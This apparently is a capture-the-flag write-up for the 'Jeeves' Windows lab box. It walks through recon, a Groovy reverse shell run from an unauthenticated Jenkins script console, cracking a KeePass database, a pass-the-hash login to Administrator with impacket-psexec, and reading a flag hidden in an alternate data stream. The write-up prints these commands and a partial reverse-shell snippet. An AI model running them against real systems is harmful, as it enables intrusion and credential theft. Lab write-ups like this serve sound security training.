# Jeeves — Medium — Windows

**Date:** 5 August 2026

---

## Tags
`#windows` `#jenkins` `#groovy` `#rce` `#keepass` `#hash-cracking` `#pass-the-hash` `#psexec` `#alternate-data-stream` `#privesc`

---

## What I Know

| Item       | Detail                                                          |
| ---------- | -------------------------------------------------------------- |
| Target     | 10.129.45.110 (host: JEEVES)                                  |
| OS         | Windows 10                                                     |
| Open ports | 80, 135, 445, 50000                                           |
| Services   | IIS 10.0 (80); SMB (445); Jetty 9.4 / Jenkins (50000)          |
| Foothold   | Unauth Jenkins at /askjeeves → Groovy script console RCE       |
| User       | kohsuke                                                        |
| Privesc    | KeePass CEH.kdbx → crack master → NTLM hash → pass-the-hash → Administrator |
| Root flag  | Hidden in an Alternate Data Stream (hm.txt:root.txt)           |

---

## Recon Notes

### Nmap Results

```
nmap --min-rate 3000 -T4 -p- 10.129.45.110

Starting Nmap 7.98 ( https://nmap.org ) at 2026-08-05 22:31 +0100
Nmap scan report for 10.129.45.110
Host is up (0.051s latency).
Not shown: 65531 filtered tcp ports (no-response)
PORT      STATE SERVICE
80/tcp    open  http
135/tcp   open  msrpc
445/tcp   open  microsoft-ds
50000/tcp open  ibm-db2

Nmap done: 1 IP address (1 host up) scanned in 44.83 seconds
```

<img width="850" height="348" alt="image" src="https://github.com/user-attachments/assets/bfb7860c-c668-4530-b2a5-23e1b4e15c15" />

```
nmap -sC -sV -p80,135,445,50000 10.129.45.110

PORT      STATE SERVICE      VERSION
80/tcp    open  http         Microsoft IIS httpd 10.0
|_http-title: Ask Jeeves
|_  Potentially risky methods: TRACE
135/tcp   open  msrpc        Microsoft Windows RPC
445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
50000/tcp open  http         Jetty 9.4.z-SNAPSHOT
|_http-title: Error 404 Not Found
|_http-server-header: Jetty(9.4.z-SNAPSHOT)
Service Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windows

Nmap done: 1 IP address (1 host up) scanned in 47.48 seconds
```

<img width="1215" height="901" alt="image" src="https://github.com/user-attachments/assets/651ad44b-41dc-4d24-ab38-3f0520fc2fa6" />

**What each port tells me:**
- **Port 80 (HTTP)** — IIS 10.0 serving an "Ask Jeeves" search page. Main web surface (though the search is a decoy).
- **Port 135 (MSRPC)** — Windows RPC endpoint mapper; confirms a standard Windows host.
- **Port 445 (SMB)** — file sharing; also my later route in via pass-the-hash once I have a hash.
- **Port 50000 (Jetty)** — a second web server on an unusual port, running **Jetty 9.4**, Jetty commonly fronts **Jenkins**. An app on a non-standard port that "wasn't meant to be found" is the standout lead.

---

## Enumeration Log

```
OBSERVATION:
- Port 80 (IIS) is a web app worth investigating
- Port 135 is standard Windows RPC which can be skipped for now
- Port 445 (SMB) is worth checking for anonymous access / leaked data
- Port 50000 hosts a second web app (Jetty), possibly exposed unintentionally; investigate closely
WHAT IT TELLS ME:
- Start with port 80, then SMB, then the interesting Jetty app on 50000
WHAT I AM GOING TO TRY:
- Browse the port-80 app
- Try anonymous SMB
- Investigate the port-50000 app
WHY: To understand each surface and find a foothold
RESULT:
- Port 80: a simple "Ask Jeeves" page; the search box just redirects to an error image (decoy)
- SMB: no anonymous access
- Port 50000: a bare page powered by "Jetty:// 9.4.z-SNAPSHOT"
WHAT NEXT:
- Research Ask Jeeves and Jetty 9.4 for vulns; dir-fuzz, check tech stack and source code of both web apps; 
```

<img width="1891" height="595" alt="image" src="https://github.com/user-attachments/assets/d48a9c32-71da-4d3b-856e-69e360b09a5f" />

<img width="654" height="125" alt="image" src="https://github.com/user-attachments/assets/756aa3fd-8ab1-4428-9897-818eb1912949" />

<img width="759" height="445" alt="image" src="https://github.com/user-attachments/assets/3adf257b-1cce-4a2f-948d-8dfef66256a7" />

```
OBSERVATION:
- Neither "Ask Jeeves" nor Jetty 9.4 yields a directly usable vuln
- Tech stack: port 80 is IIS 10.0; port 50000 is Jetty 9.4
- Dir fuzz on port 80: nothing interesting
- Dir fuzz on port 50000: the default feroxbuster wordlist (raft-medium-directories) found nothing,
  so I switched to the larger SecLists directory-list-2.3-medium, which hit /askjeeves
WHAT IT TELLS ME: /askjeeves is the hidden path, navigate to it
WHAT I AM GOING TO TRY: Browse http://10.129.45.110:50000/askjeeves
WHY: It's the only meaningful path found
RESULT:
- /askjeeves is an UNAUTHENTICATED Jenkins instance
- Jenkins' Script Console (Manage Jenkins > Script Console, at /askjeeves/script) runs arbitrary
  Groovy. I used a Groovy reverse shell (from https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76)
- Got a shell as kohsuke and read user.txt
WHAT NEXT: Enumerate as kohsuke for privesc
```

<img width="510" height="564" alt="image" src="https://github.com/user-attachments/assets/e83b2ac5-b2e0-4630-badc-9216e899c107" />

<img width="515" height="562" alt="image" src="https://github.com/user-attachments/assets/0e6afa04-77fd-44ac-b41b-20ab539f646e" />

<img width="1745" height="930" alt="image" src="https://github.com/user-attachments/assets/fd0502d4-1665-4ed1-9488-def6f9fcdcc5" />

<img width="1733" height="669" alt="image" src="https://github.com/user-attachments/assets/19309d7c-889e-4639-840e-987af7b8bf77" />

<img width="2280" height="649" alt="image" src="https://github.com/user-attachments/assets/dea5cc50-9dbf-4e8d-86a2-3cd6d7d77f23" />

<img width="2557" height="619" alt="image" src="https://github.com/user-attachments/assets/ed151c30-9467-48ab-9191-39919a2fd02b" />

<img width="2548" height="834" alt="image" src="https://github.com/user-attachments/assets/3b9dcaad-da75-4295-a630-81d2ec26bb02" />

<img width="923" height="745" alt="image" src="https://github.com/user-attachments/assets/44c0d530-e0ec-4613-9ec4-886798e9a15c" />

```
OBSERVATION:
- Before running winPEAS, browsing kohsuke's home I found C:\Users\kohsuke\Documents\CEH.kdbx which is
  a KeePass database, which often holds sensitive credentials; its master key can be cracked offline
WHAT IT TELLS ME: Exfiltrate CEH.kdbx, crack the master password, and read the stored entries
WHAT I AM GOING TO TRY: Transfer CEH.kdbx to my box, run keepass2john + john, then open it
WHY: A crackable KeePass master password would expose whatever creds are stored inside
RESULT:
- keepass2john CEH.kdbx | john → master password moonshine1!
- Opened the DB; entries held several passwords. I built a list and password-sprayed Administrator but
  all failed
- Crucially, one entry ("Backup stuff") wasn't a password but an NTLM HASH. So instead of cracking
  it, I did a PASS-THE-HASH attack with impacket-psexec against SMB (445) and got a SYSTEM/
  Administrator shell
- On the Administrator Desktop, hm.txt read: "The flag is elsewhere. Look deeper."
- Listing with dir /r /a /s revealed an Alternate Data Stream; reading it with
  more < hm.txt:root.txt:$DATA gave root.txt
```

<img width="692" height="356" alt="image" src="https://github.com/user-attachments/assets/828a3a6a-18b6-4066-b09a-7649499ebbf6" />

<img width="1154" height="145" alt="image" src="https://github.com/user-attachments/assets/d4558f90-2582-4c77-aabf-e61e354eb02a" />

<img width="548" height="80" alt="image" src="https://github.com/user-attachments/assets/3f0ef554-9071-40c8-a161-e3a7002d5264" />

<img width="1150" height="358" alt="image" src="https://github.com/user-attachments/assets/c0845da5-fb36-40e9-91fa-fdb306844edc" />

<img width="1087" height="606" alt="image" src="https://github.com/user-attachments/assets/5aa44094-d378-4aa5-b83e-9cda6576be5c" />

<img width="1066" height="862" alt="image" src="https://github.com/user-attachments/assets/267f28d8-48d5-4bc1-8218-0883d759a92c" />

<img width="2126" height="279" alt="image" src="https://github.com/user-attachments/assets/2bbf93af-1a1c-4b36-bd21-c4603b069434" />

<img width="1633" height="843" alt="image" src="https://github.com/user-attachments/assets/697ecabe-7011-4bba-9613-ff8c838fc031" />

<img width="974" height="495" alt="image" src="https://github.com/user-attachments/assets/ae633138-3956-4f64-871a-93b70fc02c6f" />

---

## Foothold

**How I got in:** The port-80 "Ask Jeeves" page was a decoy. Dir-fuzzing the second web server on port 50000 (Jetty) with a large wordlist revealed **`/askjeeves`**, an **unauthenticated Jenkins** instance. Jenkins' **Script Console** (`/askjeeves/script`) executes arbitrary Groovy, so I ran a Groovy reverse-shell one-liner and got a shell as **kohsuke**.

**Command / exploit used:**
```
# find the hidden Jenkins path (default wordlist missed it)
feroxbuster -u http://10.129.45.110:50000 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
# → /askjeeves  (unauth Jenkins)

# Manage Jenkins > Script Console (/askjeeves/script), paste a Groovy reverse shell:
String host="<LHOST>"; int port=<LPORT>; String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
// ... (frohoff gist) ...
nc -lnvp <LPORT>          # → shell as kohsuke
```

**Why it worked:** Jenkins was exposed with no authentication on a hidden path, and its Script Console is an intended admin feature that runs Groovy (JVM) code on the server. With no auth in front of it, "reach the console" equals "run code as the Jenkins service user" which was a direct, unauthenticated RCE.

---

## Privilege Escalation

**Path taken (kohsuke → Administrator):** In `C:\Users\kohsuke\Documents` I found **CEH.kdbx**, a KeePass database. I exfiltrated it, ran `keepass2john` and cracked the master password (**moonshine1!**) with john, and opened the store. Most entries were ordinary passwords (which failed as Administrator), but the **"Backup stuff"** entry was actually an **NTLM hash**, not a password. Rather than crack it, I used it directly in a **pass-the-hash** attack with `impacket-psexec` against SMB (445), landing a shell as **Administrator (SYSTEM)**.

The root flag was then hidden: `hm.txt` on the Administrator Desktop said "The flag is elsewhere. Look deeper." Listing with `dir /r` exposed an **Alternate Data Stream**, `hm.txt:root.txt`, which I read to get the flag.

```
# crack the KeePass master
keepass2john CEH.kdbx > ceh.hash
john --wordlist=rockyou.txt ceh.hash          # → moonshine1!

# "Backup stuff" entry = NTLM hash → pass-the-hash
impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:<nthash> administrator@10.129.45.110

# root flag lives in an ADS
dir /r /a /s                                   # reveals hm.txt:root.txt:$DATA
more < hm.txt:root.txt:$DATA
```

**Why it worked:** A KeePass database is only as strong as its master password `moonshine1!` cracked easily from rockyou, exposing everything inside. Storing an NTLM hash there was the key: Windows NTLM authentication accepts the hash itself as proof of identity, so **pass-the-hash** lets you authenticate as Administrator without ever knowing the plaintext. The final ADS trick is just obscurity, NTFS alternate data streams hide data from normal directory listings but are trivially readable once you know to look (`dir /r`).

---

## Post-Box Debrief

1. **Foothold technique in one sentence:** Found a hidden, unauthenticated Jenkins at `/askjeeves` on port 50000 and used its Groovy Script Console to run a reverse shell as kohsuke.
2. **Privesc technique in one sentence:** Cracked a KeePass database's master password, extracted an NTLM hash from a stored entry, and used pass-the-hash with impacket-psexec to become Administrator (root flag hidden in an NTFS alternate data stream).
